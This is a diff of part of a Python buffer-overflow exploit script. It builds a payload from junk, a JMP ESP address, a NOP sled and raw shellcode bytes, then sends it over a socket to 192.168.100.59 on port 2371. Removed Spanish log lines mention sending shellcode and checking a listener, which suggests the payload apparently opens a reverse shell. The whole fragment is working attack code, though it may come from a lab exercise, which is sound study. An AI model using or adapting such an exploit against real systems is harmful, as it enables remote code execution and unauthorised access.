@@ -42,14 +42,11 @@ shellcode += b"\x4e\xd0\xec\x3a\xf1\x67\x19\x63\xb1\xe6\x82"
 shellcode += b"\xe0\x6e\x5a\x7f\x7c\x11\xdf\x3f\xdb\x77\xa8"
 shellcode += b"\xeb\xf6\x64\x89\x7b\x49"
 
-log.info("Enviando shellcode")
-
 shell = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-connect = shell.connect(("192.168.100.59", 2371))
+shell.connect(("192.168.100.59", 2371))
+shell.recv(1024)
 
 shell.send(junk + jmpesp + nops + shellcode + b"\n\r")
 
-data = shell.recv(1024)
+shell.recv(1024)
 shell.close()
-
-log.success("Revisa tu listener")
